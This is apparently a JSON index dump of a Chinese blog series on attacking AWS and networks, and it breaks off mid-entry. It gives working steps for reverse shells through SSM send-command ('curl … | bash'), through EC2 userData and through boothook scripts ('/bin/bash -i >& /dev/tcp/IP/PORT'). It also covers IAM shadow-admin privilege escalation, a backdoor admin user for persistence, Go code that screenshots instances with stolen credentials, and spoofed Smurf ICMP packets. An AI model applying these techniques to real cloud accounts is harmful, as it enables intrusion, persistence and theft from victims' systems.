[{"content":"ssm:SendCommand 擁有該權限的用戶可以發送命令到一個或多個已註冊在SSM的EC2 instance或其他服務，允許在這些instance或主機上執行操作，例如運行腳本、管理更新或執行其他自動化任務。\n使用send command執行reverse shell AWS SSM Send Command 1 2 3 \u0026gt; aws ssm send-command --instance-ids {INSTANCE_ID} \\ --document-name \u0026#34;AWS-RunShellScript\u0026#34; --output text \\ --parameters commands=\u0026#34;curl REVERSE_SHELL | bash\u0026#34; 執行完上面的Command line後會回傳一串json output Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 { \u0026#34;Command\u0026#34;: { \u0026#34;CommandId\u0026#34;: \u0026#34;XXXXXXXXX\u0026#34;, \u0026#34;DocumentName\u0026#34;: \u0026#34;AWS-RunShellScript\u0026#34;, \u0026#34;DocumentVersion\u0026#34;: \u0026#34;$DEFAULT\u0026#34;, \u0026#34;Comment\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;ExpiresAfter\u0026#34;: \u0026#34;DATE\u0026#34;, \u0026#34;Parameters\u0026#34;: {}, \u0026#34;InstanceIds\u0026#34;: [ \u0026#34;i-XXXXXXXXX\u0026#34; ], \u0026#34;Targets\u0026#34;: [], \u0026#34;RequestedDateTime\u0026#34;: \u0026#34;DATE\u0026#34;, \u0026#34;Status\u0026#34;: \u0026#34;Pending\u0026#34;, \u0026#34;StatusDetails\u0026#34;: \u0026#34;Pending\u0026#34;, \u0026#34;OutputS3Region\u0026#34;: \u0026#34;us-east-1\u0026#34;, \u0026#34;OutputS3BucketName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;OutputS3KeyPrefix\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;MaxConcurrency\u0026#34;: \u0026#34;50\u0026#34;, \u0026#34;MaxErrors\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;TargetCount\u0026#34;: 1, \u0026#34;CompletedCount\u0026#34;: 0, \u0026#34;ErrorCount\u0026#34;: 0, \u0026#34;DeliveryTimedOutCount\u0026#34;: 0, \u0026#34;ServiceRole\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NotificationConfig\u0026#34;: { \u0026#34;NotificationArn\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NotificationEvents\u0026#34;: [], \u0026#34;NotificationType\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;CloudWatchOutputConfig\u0026#34;: { \u0026#34;CloudWatchLogGroupName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;CloudWatchOutputEnabled\u0026#34;: false }, \u0026#34;TimeoutSeconds\u0026#34;: 3600, \u0026#34;AlarmConfiguration\u0026#34;: { \u0026#34;IgnorePollAlarmFailure\u0026#34;: false, \u0026#34;Alarms\u0026#34;: [] }, \u0026#34;TriggeredAlarms\u0026#34;: [] } } 查看detail 1 2 3 \u0026gt; aws ssm list-command-invocations \\ --command-id \u0026#34;{COMMAND_ID}\u0026#34; \\ #就是上面那串json的command id --details 攔截SSM Session 這個研究中，先上文章\n","date":"2023-10-13T00:00:00Z","permalink":"http://localhost:1313/p/day-30-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ssm/","title":"[Day 30] 天堂雲端 - SSM"},{"content":"Http session Http session 利用了HTTP/1.1中的Keep-Alive功能。\nKeep-Alive 早期的Http版本中，每次的Http request\u0026amp;response完成後，連線就會被關閉。也就是說，當網頁有多個元素的時候（圖片、CDN、腳本等），每個元素的請求都要重新建一個TCP連線，因為建立TCP連線需要時間（從TCP\u0026amp;UDP連線可以測得出來，同樣的code UDP協議就是快很多），這個效果是非常不好的。\n為了解決這個問題，HTTP/1.1引入了Persistent Connection（持久連線），也可以稱作Keep-Alive，功能目的是允許在已經建立的TCP連線上執行多次的Http request\u0026amp;response，不用在重新連接。\nHttp Flood Http Get Flood和Http Post Flood兩個都是常見的Http Flood攻擊，跟Http session一樣作用於應用層，同樣更難檢測跟防禦。\n但Http Get/Post Flood都是大量發送Request到目標主機，嘗試消耗目標服務器的頻寬與資源；Http Session Flood主要是濫用Http session管理機制嘗試消耗目標服務器的資源，比如說創建大量未完成或畸形的對話連接。\n","date":"2023-10-13T00:00:00Z","permalink":"http://localhost:1313/p/day-30-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-http-session/","title":"[Day 30] 閑的沒事 - HTTP SESSION"},{"content":"SSM AWS Systems Manager (SSM) 是一個AWS服務，提供一個集中式的解決方案，用於管理和遠程操作AWS環境中的多個instance。\n主要功能 遠程執行命令 使用SSM控制EC2 instance，而無需進行SSH或RDP連接。這有助於提高安全性和簡化操作。 系統監控 SSM提供了關於EC2 instance的性能和運行狀況的詳細資訊，可以監控指標、設定警報並自動回應事件。 安全性 SSM 使用IAM來控制對instance的訪問權限，可以更精準的控制誰可以進行什麼操作。 設定Session Manager 在EC2上設定好Session Manager後即可使用(需要注意role有沒有設定到) Session Manager是SSM的一部分，允許使用AWS控制台或CLI直接從執行主機啟動會話。\n訪問 Remote Access:\n1 \u0026gt; aws ssm start-session --target {EC2_INSTANCE_ID} 會出現現在是由哪個account遠程訪問EC2 instance\n1 Starting session with SessionId: XXXXXXXXXX ","date":"2023-10-12T00:00:00Z","permalink":"http://localhost:1313/p/day-29-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-systems-manager/","title":"[Day 29] 天堂雲端 - Systems Manager"},{"content":"Code udp封包分片\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; ) func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 udpAddr, err := net.ResolveUDPAddr(\u0026#34;udp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort)) if err != nil { log.Fatal(err) } conn, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, udpAddr) if err != nil { log.Fatal(err) } defer conn.Close() payload := `又是熟悉的payload，總長1360` fmt.Println(len(payload)) # 1360 chunkSize := 1000 for i := 0; i \u0026lt; len(payload); i += chunkSize { end := i + chunkSize if end \u0026gt; len(payload) { end = len(payload) } _, err = conn.Write([]byte(payload[i:end])) if err != nil { log.Fatal(err) } fmt.Printf(\u0026#34;Sent fragment: %s\\n\u0026#34;, payload[i:end]) time.Sleep(1 * time.Millisecond) } fmt.Println(\u0026#34;Packet sent successfully!\u0026#34;) } 測試 chunkSize不管是設定100還是1000的時候，通常只發送一次封包後下一次發送就會出現connection refused的錯誤訊息。因為我啟動一個Flask Web Endpoint監聽這個端口，Flask web service默認只支援HTTP over TCP。當我測試時使用UDP協議向目標主機發送請求時，由於Flask不處理 UDP 請求，因此不會有任何響應。當我的UDP客戶端再次嘗試發送時，就會收到一個connection refused的錯誤。\n看起來做壞事分片發送不能常用UDP協議了，容易出現connection refused。用其他常用的PORT也是如此。\n","date":"2023-10-12T00:00:00Z","permalink":"http://localhost:1313/p/day-29-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-fragmentation-udp/","title":"[Day 29] 閑的沒事 - Fragmentation UDP"},{"content":"權限升級 在AWS雲端環境中，權限升級是透過IAM完成升級的，攻擊者需要找到哪個帳戶可以做到這件事。\nShadow admin 這裡有詳細列出各大雲端服務的shadow admin。這裡先列出幾個特別的：\niam-PassRole \u0026amp; ec2-AssociateIamInstanceProfile AWS官方文件 iam-PassRole用於控制哪些身份可以將IAM角色分配給其他AWS服務或資源。例如：具有該權限才可以將角色分配給EC2 intance。 ec2-AssociateIamInstanceProfile權限用於管理EC2 instance與IAM Instance Profile的關聯，確保EC2 instance有獲取所需的權限。 如果攻擊者可以存去擁有這兩個權限的帳戶，可以將特權instance profile附加在感染的EC2 instance上。\niam-PassRole \u0026amp; iam-CreateInstanceProfile \u0026amp; iam-AddRoleToInstanceProfile AWS官方文件 iam-CreateInstanceProfile權限允許用戶或角色建立新的IAM Instance Profile，例如可以使用EC2 instance訪問DynamoDB；iam-AddRoleToInstanceProfile權限允許用戶或角色添加到現有的IAM Instance Profile中。 iam-CreateInstanceProfile跟iam-AddRoleToInstanceProfile通常一起使用，所以通常用戶或角色裡面兩個會同時存在。攻擊者如果可存取這兩個權限的帳戶，可以建立特權instance profile到受感染的instance。\niam-PassRole \u0026amp; iam-RemoveRoleFromInstanceProfile \u0026amp;iam-AddRoleToInstanceProfile iam-RemoveRoleFromInstanceProfile權限允許刪除IAM配置文件中的用戶或角色。在AWS中，通常一個instance只能對應一個角色，但一個角色可以對應多個instance，以此降低權限管理的複雜性。 例如說一個Lamdba Function只能跟一個角色關聯，該角色定義了這個Lamdba函數在執行期間的權限。一個AWS Glue Job只能與一個角色關聯，該角色定義了Glue Job在執行期間的權限。 如果一個instance已經有角色了，攻擊者可以利用iam-RemoveRoleFromInstanceProfile刪除原本角色，添加特權instance profile到受感染的instance。\niam-SetDefaultPolicyVersion \u0026amp; （ iam:CreatePolicyVersion or iam:PutUserPolicy） AWS官方文件 iam:CreatePolicyVersion跟iam:PutUserPolicy同樣都是允許IAM account為一個已存在的管理式策略創建新的版本。例如說把Action改成\u0026quot; * \u0026ldquo;，Resource也改成\u0026rdquo; * \u0026ldquo;。或是直接替換成有這些權限的role。兩者的差異主要是iam:PutUserPolicy修改用戶的行內策略，而 iam:CreatePolicyVersion 為管理式策略創建新版本。 iam-SetDefaultPolicyVersion權限允許將特定權限版本設定為默認版本。通常版本是按順序創建的，新版本會取代舊版本。 通過設定默認版本，攻擊者可以修改客戶管理的policy，將非特權instance提升為特權instance\nec2:ModifyInstanceAttribute 除了可以用於建立reverse shell之外，可以改變任何使用者的數據。例如說建立EC2 instance到ECS叢集中，這樣可以滲透這些服務(ex docker)，並竊取role。\n修改了ECS agent的配置文件（範例）\n1 2 #!/bin/bash echo ECS_CLUSTER=\u0026lt;cluster-name\u0026gt; \u0026gt;\u0026gt; /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= \u0026gt;\u0026gt; /etc/ecs/ecs.config; 權限維持 對於雲端環境來說，創建一個具有完整存取權限的新用戶是最簡單的進入後門的方法（但很容易被發現）\n新用戶 1 \u0026gt; aws iam add-user-to-group --user-name BlackdoorUser --group-name AdminGroup AWS提權 1. 取得Role policy AWS Role Policy分兩種 inline policy 管理員創建管理的策略，可以直接與AWS indentity(account、role、group)相關聯，並附加在這個identity上。通常有這個意味著有好料。 attack policy AWS 托管策略（AWS Managed Policies） Group/Role/Instance Policy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 func main() { sess, err := session.NewSession(\u0026amp;aws.Config{ Credentials: credentials.NewStaticCredentials(access_key_id, secret_access_key, token), Region: aws.String(region), }) if err != nil { fmt.Println(\u0026#34;Error creating session:\u0026#34;, err) return } svc := iam.New(sess) roleName := \u0026#34;ROLE\u0026#34; # 填寫角色名稱 // Get Policy // Inline Policy inlineInput := \u0026amp;iam.ListRolePoliciesInput{ RoleName: aws.String(roleName), } inlineResult, err := svc.ListRolePolicies(inlineInput) if err != nil { fmt.Println(\u0026#34;Error listing role policies:\u0026#34;, err) return } fmt.Println(\u0026#34;Inline Policies:\u0026#34;) for _, policyName := range inlineResult.PolicyNames { getPolicyInput := \u0026amp;iam.GetRolePolicyInput{ RoleName: aws.String(roleName), PolicyName: policyName, } policyResult, err := svc.GetRolePolicy(getPolicyInput) if err != nil { fmt.Println(\u0026#34;Error getting role policy:\u0026#34;, err) return } policyDocument, err := url.QueryUnescape(*policyResult.PolicyDocument) if err != nil { fmt.Println(\u0026#34;Error decoding policy document:\u0026#34;, err) return } fmt.Println(\u0026#34;Policy Name:\u0026#34;, *policyResult.PolicyName) fmt.Println(\u0026#34;Policy Document:\u0026#34;, policyDocument) } fmt.Println(\u0026#34;--------------------------------\u0026#34;) fmt.Println(\u0026#34;Managed Policies:\u0026#34;) // Managed Policy managerInput := \u0026amp;iam.ListAttachedRolePoliciesInput{ RoleName: aws.String(roleName), } managerResult, err := svc.ListAttachedRolePolicies(managerInput) if err != nil { fmt.Println(\u0026#34;Error listing role policies:\u0026#34;, err) return } for _, policy := range managerResult.AttachedPolicies { fmt.Println(\u0026#34;Policy ARN:\u0026#34;, *policy.PolicyArn) } } 2. 找到Admin \u0026amp; Shadow Admin ","date":"2023-10-11T00:00:00Z","permalink":"http://localhost:1313/p/day-28-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2%E6%AC%8A%E9%99%90%E5%8D%87%E7%B4%9A/","title":"[Day 28] 天堂雲端 - EC2權限升級"},{"content":"Code 使用Dail發送tcp封包 Payload暫定長度1360\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; ) func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 conn, err := net.DialTimeout(\u0026#34;tcp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort), 10*time.Second) if err != nil { log.Fatal(err) } defer conn.Close() // build payload, length 1360 payload := `Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ Hello World\\nHello World\\nHello World\\nHello World\\nHello World\\nHello World\\n \\ ` fmt.Println(len(payload)) // _, err = conn.Write([]byte(payload)) // if err != nil { // log.Fatal(err) // } chunkSize := 1000 # 設定每個分片分割長度為1000 for i := 0; i \u0026lt; len(payload); i += chunkSize { end := i + chunkSize if end \u0026gt; len(payload) { end = len(payload) } _, err = conn.Write([]byte(payload[i:end])) if err != nil { log.Fatal(err) } fmt.Printf(\u0026#34;Sent fragment: %s\\n\u0026#34;, payload[i:end]) time.Sleep(1 * time.Millisecond) } fmt.Println(\u0026#34;Packet sent successfully!\u0026#34;) } 測試 payload長度1360，分割為每個分片不超過長度1000，可以正常發送碎片化封包 payload長度1360，分割為每個分片不超過長度100，出現write: broken pipe錯誤，顯示目標主機主動關閉連接。 大概發送10次以上就有可能出現write: broken pipe錯誤。\n","date":"2023-10-11T00:00:00Z","permalink":"http://localhost:1313/p/day-28-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-fragmentation-tcp/","title":"[Day 28] 閑的沒事 - Fragmentation TCP"},{"content":"建立新的EC2 instance做reverse shell並不一直是一個好的主意，首先，新啟動一個EC2很容易被發現。\n利用現有instance 必須要有的權限：\nec2:DescribeInstances ec2:ModifyInstanceAttribute\n首先，先暫停ec2，沒有暫停不能修改\n1 \u0026gt; aws ec2 stop-instances --instance-ids {EC2_INSTANCE_IP} 沒暫停的Output\n1 An error occurred (IncorrectInstanceState) when calling the ModifyInstanceAttribute operation: The instance \u0026#39;i-XXXXXXXXXXXX\u0026#39; is not in the \u0026#39;stopped\u0026#39; state. 成功暫停的Output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;StoppingInstances\u0026#34;: [ { \u0026#34;CurrentState\u0026#34;: { \u0026#34;Code\u0026#34;: 64, \u0026#34;Name\u0026#34;: \u0026#34;stopping\u0026#34; }, \u0026#34;InstanceId\u0026#34;: \u0026#34;i-XXXXXXXXXXXX\u0026#34;, \u0026#34;PreviousState\u0026#34;: { \u0026#34;Code\u0026#34;: 16, \u0026#34;Name\u0026#34;: \u0026#34;running\u0026#34; } } ] } Build blackdoor.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Content-Type: multipart/mixed; boundary=\u0026#34;//\u0026#34; MIME-Version: 1.0 --// Content-Type: text/cloud-config; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit Content-Disposition: attachment; filename=\u0026#34;cloud-config.txt\u0026#34; #cloud-config cloud_final_modules: - [scripts-user, always] --// Content-Type: text/x-shellscript; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit Content-Disposition: attachment; filename=\u0026#34;userdata.txt\u0026#34; #!/bin/bash echo \u0026#34;Hello World\u0026#34; \u0026gt;\u0026gt; /home/ubuntu/hello.txt # 這行是測試用的 /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1 # Reverse shell範例 --// base64 encode 1 \u0026gt; base64 -i blackdoor.sh \u0026gt; blackdoor_encoded.sh # 這是Mac寫法，其他作業系統不要抄錯了 Modify instance attribute 1 2 3 4 \u0026gt; aws ec2 modify-instance-attribute \\ --instance-id i-XXXXXXXXXXXX \\ --attribute userData \\ --value file://blackdoor_encoded.sh Start EC2 instance 1 \u0026gt; aws ec2 start-instances --instance-ids i-09d20a0b2b49d77cc Output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;StartingInstances\u0026#34;: [ { \u0026#34;CurrentState\u0026#34;: { \u0026#34;Code\u0026#34;: 0, \u0026#34;Name\u0026#34;: \u0026#34;pending\u0026#34; }, \u0026#34;InstanceId\u0026#34;: \u0026#34;i-XXXXXXXXXX\u0026#34;, \u0026#34;PreviousState\u0026#34;: { \u0026#34;Code\u0026#34;: 80, \u0026#34;Name\u0026#34;: \u0026#34;stopped\u0026#34; } } ] } 等狀態是執行中或是running的時候就可以進去EC2查看\n檢查 /var/log/cloud-init-output.log有沒有出現錯誤\n","date":"2023-10-10T00:00:00Z","permalink":"http://localhost:1313/p/day-27-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-reverse-shell-via-credential-2/","title":"[Day 27] 天堂雲端 - reverse shell via credential 2"},{"content":"Fragmentation Attack Fragmentation Attack（碎片攻擊）指的是利用IP協議的碎片化（fragmentation）機制來達成攻擊目的。IP碎片是指將一個較大的IP數據包拆分成多個較小的數據包，以適應網絡中最大傳輸單位（MTU）的限制。 以太網的MTU是1500，如果IP層有要傳輸的封包長度超過1500，那IP層就要對封包進行分片(fragmentation)，使每個封包的長度都小於1500。 使用netstat -i 查看MTU大小\n碎片化在正常的網絡通信中是一個合法且有用的過程，但攻擊者可以利用這一機制進行惡意操作。\n主要特徵與特點 碎片化利用 攻擊者可以將payload分割成小碎片，然後將這些碎片發送到目標主機，如此可以避掉防火牆或是IPS等防禦機制的檢查。\n碎片重組 目標主機收到碎片後會重組成原始數據包，這個時候有些老舊系統就有點不行了，容易造成崩潰或拒絕服務。\n具體例子 Ping of Death Ping of Death是一種利用Internet Control Message Protocol（ICMP）協議的碎片攻擊，攻擊者發送一個長度超過65535的封包，目標主機在重組分片的時候超出系統的緩衝區容量，造成緩衝區溢出。這種溢出可以導致系統崩潰或者讓攻擊者執行任意代碼。\n手法 使用ping發出一條超出緩衝區容量的封包\n1 \u0026gt; ping -c 1 -s 65537 10.211.55.3 輸出 ping of death是一個很老的攻擊手段，現在的作業系統已經不讓我們做壞事了\n1 ping: packet size 65537 is too large. Maximum is 65507 65507是65535-20(IP layer)-8(payload部分預留)=65507\nTeardrop attack 在Teardrop攻擊中，攻擊者發送一系列畸形的IP碎片，這些碎片在重組時會互相重疊。目標系統可能無法正確處理這些重疊的碎片，從而導致系統崩潰或重啟。\n","date":"2023-10-10T00:00:00Z","permalink":"http://localhost:1313/p/day-27-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-%E7%A2%8E%E7%89%87%E6%94%BB%E6%93%8Afragmentation-attack%E4%B9%8B%E7%90%86%E8%AB%96/","title":"[Day 27] 閑的沒事 - 碎片攻擊（Fragmentation Attack）之理論"},{"content":"Smurf DDOS 攻擊者發送大量偽造來源地址的ICMP封包，回應請求(ping)到目標主機，主要目的是消耗目標網絡的頻寬和資源，使其無法正常運作。 注：ICMP Flood是一種DoS攻擊，不像Smurf攻擊一樣偽造來源IP地址，只是連續地向目標主機發送ICMP消息，通常是ping請求。這將使目標主機的CPU和網絡資源耗盡，導致服務中斷。\nCode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { handle, err := pcap.OpenLive(\u0026#34;bridge100\u0026#34;, 1024, false, pcap.BlockForever) if err != nil { log.Fatal(err) } defer handle.Close() // Ethernet layer eth := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, DstMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, EthernetType: layers.EthernetTypeIPv4, } ipLayer := \u0026amp;layers.IPv4{ Version: 4, TTL: 64, Protocol: layers.IPProtocolICMPv4, SrcIP: net.ParseIP(\u0026#34;10.211.55.2\u0026#34;), DstIP: net.ParseIP(\u0026#34;10.211.55.10\u0026#34;), } icmpLayer := \u0026amp;layers.ICMPv4{ TypeCode: layers.ICMPv4TypeEchoRequest, } buffer := gopacket.NewSerializeBuffer() options := gopacket.SerializeOptions{ FixLengths: true, ComputeChecksums: true, } if err := gopacket.SerializeLayers(buffer, options, eth, ipLayer, icmpLayer, gopacket.Payload([]byte(\u0026#34;Hello, ICMP!\u0026#34;))); err != nil { log.Fatal(err) } icmpPacket := buffer.Bytes() err = handle.WritePacketData(icmpPacket) if err != nil { log.Fatal(err) } } ","date":"2023-10-09T00:00:00Z","permalink":"http://localhost:1313/p/day-26-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-smurf-ddos/","title":"[Day 26] 閑的沒事 - Smurf ddos"},{"content":"桌面截圖 在滲透測試中，桌面截圖是一種獲得額外信息或增加攻擊者瞭解目標環境的重要手段\n環境的實時視圖 運行的應用程序、開放的文件、使用中的工具 行為模式 通過定期截圖，攻擊者可以建立一個用戶的行為模式，了解最佳的攻擊時機。 身份驗證資訊 or 敏感訊息洩漏 使用者可能在他們的桌面上放置了敏感的文件或便箋，或是被擷取到像Outlook或其他通信工具的登錄窗口 AWS Cli 前提：要取得iam credential憑證（可以用SSRF等手段取得） get-console-screenshot\n1 \u0026gt; aws ec2 get-console-screenshot --instance-id {EC2_INSTANCE_ID} --output text Output:\n1 image bytes Code 前提：要取得iam credential憑證（可以用SSRF等手段取得）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;image/jpeg\u0026#34; \u0026#34;os\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws/credentials\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws/session\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/service/ec2\u0026#34; ) func main() { // AWS Session sess, err := session.NewSession(\u0026amp;aws.Config{ Region: aws.String(\u0026#34;XXXXXXXX\u0026#34;), Credentials: credentials.NewStaticCredentials(\u0026#34;XXX\u0026#34;, \u0026#34;XXXXXXXXXX\u0026#34;, \u0026#34;\u0026#34;), }) if err != nil { fmt.Println(\u0026#34;Error creating session:\u0026#34;, err) return } // EC2 Service Client svc := ec2.New(sess) // EC2 instance ID instanceID := \u0026#34;X-XXXXXXXXXXXXX\u0026#34; // Get console screenshot input := \u0026amp;ec2.GetConsoleScreenshotInput{ InstanceId: aws.String(instanceID), } // Get screenshot result result, err := svc.GetConsoleScreenshot(input) if err != nil { fmt.Println(\u0026#34;Error getting console screenshot:\u0026#34;, err) return } // Decode screenshot imageData := *result.ImageData imgBytes, err := base64.StdEncoding.DecodeString(imageData) if err != nil { fmt.Println(\u0026#34;Error decoding image data:\u0026#34;, err) return } // Build image buffer imgBuf := bytes.NewReader(imgBytes) // Decode image img, err := jpeg.Decode(imgBuf) if err != nil { fmt.Println(\u0026#34;Error decoding image:\u0026#34;, err) return } // Build image file imgFile, err := os.Create(\u0026#34;screenshot.jpg\u0026#34;) if err != nil { fmt.Println(\u0026#34;Error creating image file:\u0026#34;, err) return } defer imgFile.Close() // Encode image to file jpeg.Encode(imgFile, img, nil) fmt.Println(\u0026#34;Screenshot saved as screenshot.png\u0026#34;) } ","date":"2023-10-08T00:00:00Z","permalink":"http://localhost:1313/p/day-25-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%9C%96screenshot/","title":"[Day 25] 天堂雲端 - EC2 桌面截圖（screenshot）"},{"content":"QOTD Quote of the Day（每日引言）協議是為了在網際網絡上提供一種簡單的測試和演示網路通訊的能力而創建的。它的主要目的不是為了傳送實際的有用數據，而是為了展示伺服器之間的基本通信能力和連接性。在現今已經相對不常見，並且在大多數實際應用中已經被淘汰或不再使用。但是還是出現在了Cloudflare 2021 年第二季 DDoS 攻擊趨勢報告中。\n測試 在inet設定qotd，qotd佔用port 17\n1 \u0026gt; telnet localhost 17 code 跟chargen一樣，使感染的機器把response送到目標機 把port改成17就可以了\n","date":"2023-10-08T00:00:00Z","permalink":"http://localhost:1313/p/day-25-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-qotd%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A/","title":"[Day 25] 閑的沒事 - QOTD反射攻擊"},{"content":"AWS CloudInit cloud-init package是Canonical建構的開源應用程式，用於引導在雲端環境中的Linux image。AWS CloudInit是一種用於自動化EC2 instance初始化和設置的工具，可以在EC2 instance啟動過程中執行各種初始化任務。\nAWS Cloud Boothook AWS Cloud Boothhook是用於EC2 instance啟動期間執行自定義命令的機制。具體來說，boothook是cloudinit配置的一部份，主要用於：\n自定義初始化行為 自動化任務 Reverse shell Build reverse shell code 建立reverse shell，這裡用bash做示範 backdoor.sh\n1 2 3 #!/bin/bash echo \u0026#34;Hello World\u0026#34; \u0026gt;\u0026gt; hello.txt /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/IP/9000 0\u0026gt;\u0026amp;1 # Revese shell範例 backdoor_encoded.sh\n1 base64 -i blackdoor.sh \u0026gt; blackdoor_encoded.sh # 這是Mac的寫法 啟動新的EC2 instance 攻擊者已經獲取合法有限權限，其中包括啟動新實例所需的權限。\niam:PassRole ec2:RunInstances\n1 2 3 4 5 6 7 \u0026gt; aws ec2 run-instances \\ --image-id ami-xxxxxxxxxxxxxxxxx \\ --instance-type t2.micro \\ --key-name YourKeyPairName \\ --key-name SSHKey \\ --user-data file://backdoor_encoded.sh \\ --security-group-ids SecurityGroup ssh key一定要寫，要不然建完發現進不去\u0026hellip;\nOutput:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 { \u0026#34;Groups\u0026#34;: [], \u0026#34;Instances\u0026#34;: [ { \u0026#34;AmiLaunchIndex\u0026#34;: 0, \u0026#34;ImageId\u0026#34;: \u0026#34;ami-XXXXXXXXXXXXX\u0026#34;, \u0026#34;InstanceId\u0026#34;: \u0026#34;i-XXXXX\u0026#34;, \u0026#34;InstanceType\u0026#34;: \u0026#34;t2.micro\u0026#34;, \u0026#34;LaunchTime\u0026#34;: \u0026#34;Date\u0026#34;, \u0026#34;Monitoring\u0026#34;: { \u0026#34;State\u0026#34;: \u0026#34;disabled\u0026#34; }, \u0026#34;Placement\u0026#34;: { \u0026#34;AvailabilityZone\u0026#34;: \u0026#34;XXXXXXX\u0026#34;, \u0026#34;GroupName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Tenancy\u0026#34;: \u0026#34;default\u0026#34; }, \u0026#34;PrivateDnsName\u0026#34;: \u0026#34;....\u0026#34;, \u0026#34;PrivateIpAddress\u0026#34;: 